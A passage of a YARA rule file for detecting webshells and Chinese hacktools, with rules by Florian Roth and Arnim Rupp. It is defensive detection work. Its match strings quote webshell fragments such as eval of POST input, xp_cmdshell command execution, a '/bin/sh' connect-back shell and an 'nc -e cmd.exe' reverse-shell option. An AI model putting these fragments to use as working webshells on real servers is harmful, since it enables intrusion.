        $s2 = "o.language = \"vbscript\"" fullword ascii
        $s3 = "o.addcode(Request(\"SC\"))" fullword ascii
    condition:
        filesize < 1KB and all of them
}

rule Tools_2015 {
    meta:
        description = "Chinese Hacktool Set - file 2015.jsp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "8fc67359567b78cadf5d5c91a623de1c1d2ab689"
        id = "eb2826ab-ef8d-5a93-9ede-f5bbd7ab4ff4"
    strings:
        $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
        $s4 = "System.out.println(Oute.toString());" fullword ascii
        $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
        $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
        $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
    condition:
        filesize < 7KB and all of them
}

rule ChinaChopper_temp_2 {
    meta:
        description = "Chinese Hacktool Set - file temp.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "604a4c07161ce1cd54aed5566e5720161b59deee"
        id = "3952ed2b-fb27-5c45-9cd7-b7a300b37c0e"
    strings:
        $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
    condition:
        filesize < 150 and all of them
}

rule templatr {
    meta:
        description = "Chinese Hacktool Set - file templatr.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "759df470103d36a12c7d8cf4883b0c58fe98156b"
        id = "b361a49d-1e05-5597-bf8b-735e04397ffa"
    strings:
        $s0 = "eval(gzinflate(base64_decode('" ascii
    condition:
        filesize < 70KB and all of them
}

rule reDuhServers_reDuh_3 {
    meta:
        description = "Chinese Hacktool Set - file reDuh.aspx"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "0744f64c24bf4c0bef54651f7c88a63e452b3b2d"
        id = "69f5fd6b-a9b3-500b-8723-d1c82494903d"
    strings:
        $s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
        $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
        $s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
        $s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
    condition:
        filesize < 40KB and all of them
}

rule ChinaChopper_temp_3 {
    meta:
        description = "Chinese Hacktool Set - file temp.aspx"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"
        id = "573e7da6-f58f-5814-b3e8-a0db3ecfe558"
    strings:
        $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
        $s1 = "\"],\"unsafe\");%>" ascii
    condition:
        uint16(0) == 0x253c and filesize < 150 and all of them
}

rule Shell_Asp {
    meta:
        description = "Chinese Hacktool Set Webshells - file Asp.html"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "5e0bc914ac287aa1418f6554ddbe0ce25f2b5f20"
        id = "52089205-8f36-5a0b-a1ae-67c91a253ad2"
    strings:
        $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
        $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
        $s3 = "function Command(cmd, str){" fullword ascii
    condition:
        filesize < 100KB and all of them
}


rule Txt_aspxtag {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspxtag.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "42cb272c02dbd49856816d903833d423d3759948"
        id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
    strings:
        $s1 = "String wGetUrl=Request.QueryString[" fullword ascii
        $s2 = "sw.Write(wget);" fullword ascii
        $s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii
    condition:
        filesize < 2KB and all of them
}

rule Txt_php {
    meta:
        description = "Chinese Hacktool Set - Webshells - file php.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "eaa1af4b898f44fc954b485d33ce1d92790858d0"
        id = "65d5c46f-006d-58f9-bb7f-0a2e1f1853bd"
    strings:
        $s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
        $s2 = "gzuncompress($_SESSION['api']),null);" ascii
        $s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
        $s4 = "if(empty($_SESSION['api']))" fullword ascii
    condition:
        filesize < 1KB and all of them
}

rule Txt_aspx1 {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspx1.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"
        id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
    strings:
        $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item["
        $s1 = "],\"unsafe\");%>" fullword ascii
    condition:
        filesize < 150 and all of them
}

rule Txt_shell {
    meta:
        description = "Chinese Hacktool Set - Webshells - file shell.c"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "8342b634636ef8b3235db0600a63cc0ce1c06b62"
        id = "3e4c5928-346e-541b-b1a8-b37d5e3abc98"
    strings:
        $s1 = "printf(\"Could not connect to remote shell!\\n\");" fullword ascii
        $s2 = "printf(\"Usage: %s <reflect ip> <port>\\n\", prog);" fullword ascii
        $s3 = "execl(shell,\"/bin/sh\",(char *)0);" fullword ascii
        $s4 = "char shell[]=\"/bin/sh\";" fullword ascii
        $s5 = "connect back door\\n\\n\");" fullword ascii
    condition:
        filesize < 2KB and 2 of them
}

rule Txt_asp {
    meta:
        description = "Chinese Hacktool Set - Webshells - file asp.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "a63549f749f4d9d0861825764e042e299e06a705"
        id = "39a2ba9a-c429-574f-8820-5e0270a4b84c"
    strings:
        $s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
        $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
    condition:
        uint16(0) == 0x253c and filesize < 100KB and all of them
}

rule Txt_asp1 {
    meta:
        description = "Chinese Hacktool Set - Webshells - file asp1.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "95934d05f0884e09911ea9905c74690ace1ef653"
        id = "b00ab02c-c767-568c-be99-6cc731c3f1dc"
    strings:
        $s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
        $s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
        $s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
    condition:
        filesize < 70KB and 2 of them
}

rule Txt_php_2 {
    meta:
        description = "Chinese Hacktool Set - Webshells - file php.html"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "a7d5fcbd39071e0915c4ad914d31e00c7127bcfc"
        id = "66916e32-9471-54bd-944e-bb751b38d3b0"
    strings:
        $s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
        $s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
        $s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
        $s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
        $s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
        $s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
        $s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
        $s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii
    condition:
        filesize < 100KB and 4 of them
}

rule Txt_ftp {
    meta:
        description = "Chinese Hacktool Set - Webshells - file ftp.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "3495e6bcb5484e678ce4bae0bd1a420b7eb6ad1d"
        id = "311de4b0-fa19-545a-8a65-a40b255b5b39"
    strings:
        $s1 = "';exec master.dbo.xp_cmdshell 'echo open " ascii
        $s2 = "';exec master.dbo.xp_cmdshell 'ftp -s:';" ascii
        $s3 = "';exec master.dbo.xp_cmdshell 'echo get lcx.exe" ascii
        $s4 = "';exec master.dbo.xp_cmdshell 'echo get php.exe" ascii
        $s5 = "';exec master.dbo.xp_cmdshell 'copy " ascii
        $s6 = "ftp -s:d:\\ftp.txt " fullword ascii
        $s7 = "echo bye>>d:\\ftp.txt " fullword ascii
    condition:
        filesize < 2KB and 2 of them
}

rule Txt_lcx {
    meta:
        description = "Chinese Hacktool Set - Webshells - file lcx.c"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "ddb3b6a5c5c22692de539ccb796ede214862befe"
        id = "4a4e8810-6dae-526e-86f0-43de45d1c87a"
    strings:
        $s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
        $s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
        $s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
        $s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
        $s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii
    condition:
        filesize < 25KB and 2 of them
}

rule Txt_jspcmd {
    meta:
        description = "Chinese Hacktool Set - Webshells - file jspcmd.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "1d4e789031b15adde89a4628afc759859e53e353"
        id = "53eb6caf-3578-5df7-a1d8-9e4038b6f57e"
    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
    condition:
        filesize < 1KB and 1 of them
}

rule Txt_jsp {
    meta:
        description = "Chinese Hacktool Set - Webshells - file jsp.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "74518faf08637c53095697071db09d34dbe8d676"
        id = "53eb6caf-3578-5df7-a1d8-9e4038b6f57e"
    strings:
        $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
        $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
    condition:
        filesize < 715KB and 2 of them
}

rule Txt_aspxlcx {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspxlcx.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "453dd3160db17d0d762e032818a5a10baf234e03"
        id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
    strings:
        $s1 = "public string remoteip = " ascii
        $s2 = "=Dns.Resolve(host);" ascii
        $s3 = "public string remoteport = " ascii
        $s4 = "public class PortForward" ascii
    condition:
        uint16(0) == 0x253c and filesize < 18KB and all of them
}

rule Txt_xiao {
    meta:
        description = "Chinese Hacktool Set - Webshells - file xiao.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "b3b98fb57f5f5ccdc42e746e32950834807903b7"
        id = "cd375597-c343-5f7d-8574-23f700ff432b"
    strings:
        $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
        $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
        $s3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED," ascii
        $s4 = "function Command(cmd, str){" fullword ascii
        $s5 = "echo \"if(obj.value=='PageWebProxy')obj.form.target='_blank';\"" fullword ascii
    condition:
        filesize < 100KB and all of them
}

rule Txt_aspx {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspx.jpg"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "ce24e277746c317d887139a0d71dd250bfb0ed58"
        id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
    strings:
        $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
        $s2 = "Process[] p=Process.GetProcesses();" fullword ascii
        $s3 = "Copyright &copy; 2009 Bin" ascii
        $s4 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"serv" ascii
    condition:
        filesize < 100KB and all of them
}

rule Txt_Sql {
    meta:
        description = "Chinese Hacktool Set - Webshells - file Sql.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "f7813f1dfa4eec9a90886c80b88aa38e2adc25d5"
        id = "586f23d4-3a04-520d-b75b-f9bbcf67ceeb"
    strings:
        $s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii
        $s2 = "strQuery=\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"" fullword ascii
        $s3 = "strQuery = \"exec master.dbo.xp_cmdshell '\" & request.form(\"cmd\") & \"'\" " fullword ascii
        $s4 = "session(\"login\")=\"\"" fullword ascii
    condition:
        filesize < 15KB and all of them
}

rule Txt_hello {
    meta:
        description = "Chinese Hacktool Set - Webshells - file hello.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "697a9ebcea6a22a16ce1a51437fcb4e1a1d7f079"
        id = "42d01411-e333-543d-84a2-758c13bad2df"
    strings:
        $s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
        $s1 = "myProcessStartInfo.Arguments=\"/c \" & Cmd.text" fullword ascii
        $s2 = "myProcess.Start()" fullword ascii
        $s3 = "<p align=\"center\"><a href=\"?action=cmd\" target=\"_blank\">" fullword ascii
    condition:
        filesize < 25KB and all of them
}

rule WEBSHELL_Csharp_Hash_String_Oct22 {
	meta:
		description = "C# webshell using specific hash check for the password."
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Nils Kuhnert (modified by Florian Roth)"
		hash = "29c187ad46d3059dc25d5f0958e0e8789fb2a51b9daaf90ea27f001b1a9a603c"
		date = "2022-10-27"
		score = 60
		id = "c7d459be-5e61-57b7-b738-051c0cec62d2"
	strings:
		$gen1 = "void Page_Load" ascii
		$gen2 = "FromBase64String" ascii
		$gen3 = "CryptoServiceProvider" ascii
		$gen4 = "ComputeHash" ascii

		$hashing1 = "BitConverter.ToString(" ascii /* Webshell uses ToString from a string: BitConverter.ToString(ptqVQ) */
		$hashing2 = ").Replace(\"-\", \"\") == \"" ascii

      $filter1 = "BitConverter.ToString((" ascii /* Usually it's something like: return ((BitConverter.ToString((new SHA1CryptoServiceProvider() */
	condition:
		filesize < 10KB 
		and all of ($gen*) and all of ($hashing*)
		and not 1 of ($filter*)
}
import "math"
// only needed for debugging of module math:
//import "console"

/*

Webshell rules by Arnim Rupp (https://github.com/ruppde), Version 2

Rationale behind the rules:
1. a webshell must always execute some kind of payload (in $payload*). the payload is either:
-- direct php function like exec, file write, sql, ...
-- indirect via eval, self defined functions, callbacks, reflection, ...
2. a webshell must always have some way to get the attackers input, e.g. for PHP in $_GET, php://input or $_SERVER (HTTP for headers).

The input may be hidden in obfuscated code, so we look for either:
a) payload + input
b) eval-style-payloads + obfuscation
c) includers (webshell is split in 2+ files)
d) unique strings, if the coder doesn't even intend to hide

Additional conditions will be added to reduce false positves. Check all findings for unintentional webshells aka vulnerabilities ;)

The rules named "suspicious_" are commented by default. uncomment them to find more potentially malicious files at the price of more false positives. if that finds too many results to manually check, you can compare the hashes to virustotal with e.g. https://github.com/Neo23x0/munin

Some samples in the collection were UTF-16 and at least PHP and Java support it, so I use "wide ascii" for all strings. The performance impact is 1%. See also https://thibaud-robin.fr/articles/bypass-filter-upload/

Rules tested on the following webshell repos and collections:
    https://github.com/sensepost/reGeorg
    https://github.com/WhiteWinterWolf/wwwolf-php-webshell
    https://github.com/k8gege/Ladon
    https://github.com/x-o-r-r-o/PHP-Webshells-Collection
    https://github.com/mIcHyAmRaNe/wso-webshell
    https://github.com/LandGrey/webshell-detect-bypass
    https://github.com/threedr3am/JSP-Webshells
    https://github.com/02bx/webshell-venom
    https://github.com/pureqh/webshell
    https://github.com/secwiki/webshell-2
    https://github.com/zhaojh329/rtty
    https://github.com/modux/ShortShells
    https://github.com/epinna/weevely3
    https://github.com/chrisallenlane/novahot
    https://github.com/malwares/WebShell
    https://github.com/tanjiti/webshellSample
    https://github.com/L-codes/Neo-reGeorg
    https://github.com/bayufedra/Tiny-PHP-Webshell
    https://github.com/b374k/b374k
    https://github.com/wireghoul/htshells
    https://github.com/securityriskadvisors/cmd.jsp
    https://github.com/WangYihang/Webshell-Sniper
    https://github.com/Macr0phag3/WebShells
    https://github.com/s0md3v/nano
    https://github.com/JohnTroony/php-webshells
    https://github.com/linuxsec/indoxploit-shell
    https://github.com/hayasec/reGeorg-Weblogic
    https://github.com/nil0x42/phpsploit
    https://github.com/mperlet/pomsky
    https://github.com/FunnyWolf/pystinger
    https://github.com/tanjiti/webshellsample
    https://github.com/lcatro/php-webshell-bypass-waf
    https://github.com/zhzyker/exphub
    https://github.com/dotcppfile/daws
    https://github.com/lcatro/PHP-WebShell-Bypass-WAF
    https://github.com/ysrc/webshell-sample
    https://github.com/JoyChou93/webshell
    https://github.com/k4mpr3t/b4tm4n
    https://github.com/mas1337/webshell
    https://github.com/tengzhangchao/pycmd
    https://github.com/bartblaze/PHP-backdoors
    https://github.com/antonioCoco/SharPyShell
    https://github.com/xl7dev/WebShell
    https://github.com/BlackArch/webshells
    https://github.com/sqlmapproject/sqlmap
    https://github.com/Smaash/quasibot
    https://github.com/tennc/webshell

Webshells in these repos after fdupes run: 4722
Old signature-base rules found: 1315
This rules found: 3286
False positives in 8gb of common webapps plus yara-ci: 2

*/

rule WEBSHELL_PHP_Generic
{
    meta:
        description = "php webshell having some kind of input and some kind of payload. restricted to small files or big ones inclusing suspicious strings"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/14"
        modified = "2023-09-18"
        hash = "bee1b76b1455105d4bfe2f45191071cf05e83a309ae9defcf759248ca9bceddd"
        hash = "6bf351900a408120bee3fc6ea39905c6a35fe6efcf35d0a783ee92062e63a854"
        hash = "e3b4e5ec29628791f836e15500f6fdea19beaf3e8d9981c50714656c50d3b365"
        hash = "00813155bf7f5eb441e1619616a5f6b21ae31afc99caa000c4aafd54b46c3597"
        hash = "e31788042d9cdeffcb279533b5a7359b3beb1144f39bacdd3acdef6e9b4aff25"
        hash = "36b91575a08cf40d4782e5aebcec2894144f1e236a102edda2416bc75cbac8dd"
        hash = "a34154af7c0d7157285cfa498734cfb77662edadb1a10892eb7f7e2fb5e2486c"
        hash = "791a882af2cea0aa8b8379791b401bebc235296858266ddb7f881c8923b7ea61"
        hash = "9a8ab3c225076a26309230d7eac7681f85b271d2db22bf5a190adbf66faca2e6"
        hash = "0d3ee83adc9ebf8fb1a8c449eed5547ee5e67e9a416cce25592e80963198ae23"
        hash = "3d8708609562a27634df5094713154d8ca784dbe89738e63951e12184ff07ad6"
        hash = "70d64d987f0d9ab46514abcc868505d95dbf458387f858b0d7580e4ee8573786"
        hash = "259b3828694b4d256764d7d01b0f0f36ca0526d5ee75e134c6a754d2ab0d1caa"
        hash = "04d139b48d59fa2ef24fb9347b74fa317cb05bd8b7389aeb0a4d458c49ea7540"
        hash = "58d0e2ff61301fe0c176b51430850239d3278c7caf56310d202e0cdbdde9ac3f"
        hash = "731f36a08b0e63c63b3a2a457667dfc34aa7ff3a2aee24e60a8d16b83ad44ce2"
        hash = "e4ffd4ec67762fe00bb8bd9fbff78cffefdb96c16fe7551b5505d319a90fa18f"
        hash = "fa00ee25bfb3908808a7c6e8b2423c681d7c52de2deb30cbaea2ee09a635b7d4"
        hash = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
        hash = "e9423ad8e51895db0e8422750c61ef4897b3be4292b36dba67d42de99e714bff"
        hash = "7a16311a371f03b29d5220484e7ecbe841cfaead4e73c17aa6a9c23b5d94544d"
        hash = "7ca5dec0515dd6f401cb5a52c313f41f5437fc43eb62ea4bcc415a14212d09e9"
        hash = "3de8c04bfdb24185a07f198464fcdd56bb643e1d08199a26acee51435ff0a99f"
        hash = "63297f8c1d4e88415bc094bc5546124c9ed8d57aca3a09e36ae18f5f054ad172"
        hash = "a09dcf52da767815f29f66cb7b03f3d8c102da5cf7b69567928961c389eac11f"
        hash = "d9ae762b011216e520ebe4b7abcac615c61318a8195601526cfa11bbc719a8f1"
        hash = "dd5d8a9b4bb406e0b8f868165a1714fe54ffb18e621582210f96f6e5ae850b33"

        id = "294ce5d5-55b2-5c79-b0f8-b66f949efbb2"
    strings:
        $wfp_tiny1 = "escapeshellarg" fullword
        $wfp_tiny2 = "addslashes" fullword

        //strings from private rule php_false_positive_tiny
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        //$gfp_tiny1 = "addslashes" fullword
        //$gfp_tiny2 = "escapeshellarg" fullword
        $gfp_tiny3 = "include \"./common.php\";" // xcache
        $gfp_tiny4 = "assert('FALSE');"
        $gfp_tiny5 = "assert(false);"
        $gfp_tiny6 = "assert(FALSE);"
        $gfp_tiny7 = "assert('array_key_exists("
        $gfp_tiny8 = "echo shell_exec($aspellcommand . ' 2>&1');"
        $gfp_tiny9 = "throw new Exception('Could not find authentication source with id ' . $sourceId);"
        $gfp_tiny10= "return isset( $_POST[ $key ] ) ? $_POST[ $key ] : ( isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $default );"

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_php_input
        $inp1 = "php://input" wide ascii
        $inp2 = /_GET\s?\[/ wide ascii
        // for passing $_GET to a function
        $inp3 = /\(\s?\$_GET\s?\)/ wide ascii
        $inp4 = /_POST\s?\[/ wide ascii
        $inp5 = /\(\s?\$_POST\s?\)/ wide ascii
        $inp6 = /_REQUEST\s?\[/ wide ascii
        $inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
        $inp8 = /\(\s?\$_HEADERS\s?[\)\[]/ wide ascii
        // PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
        $inp15 = "_SERVER['HTTP_" wide ascii
        $inp16 = "_SERVER[\"HTTP_" wide ascii
        $inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
        $inp18 = "array_values($_SERVER)" wide ascii
        $inp19 = /file_get_contents\("https?:\/\// wide ascii
        $inp20 = "TSOP_" wide ascii

        //strings from private rule capa_php_payload
        // \([^)] to avoid matching on e.g. eval() in comments
        $cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
        $cpayload10 = /\bpreg_replace[\n\t ]{0,500}\([^\)]{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
        $cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii

        $m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
        $m_cpayload_preg_filter2 = "'|.{0,500}|e'" nocase wide ascii
        // TODO backticks

        //strings from private rule capa_gen_sus

        // these strings are just a bit suspicious, so several of them are needed, depending on filesize
        $gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
        $gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
        $gen_bit_sus6  = "self.delete"
        $gen_bit_sus9  = "\"cmd /c" nocase
        $gen_bit_sus10 = "\"cmd\"" nocase
        $gen_bit_sus11 = "\"cmd.exe" nocase
        $gen_bit_sus12 = "%comspec%" wide ascii
        $gen_bit_sus13 = "%COMSPEC%" wide ascii
        //TODO:$gen_bit_sus12 = ".UserName" nocase
        $gen_bit_sus18 = "Hklm.GetValueNames();" nocase
        // bonus string for proxylogon exploiting webshells
        $gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
        $gen_bit_sus21 = "\"upload\"" wide ascii
        $gen_bit_sus22 = "\"Upload\"" wide ascii
        $gen_bit_sus23 = "UPLOAD" fullword wide ascii
        $gen_bit_sus24 = "fileupload" wide ascii
        $gen_bit_sus25 = "file_upload" wide ascii
        // own base64 or base32 func
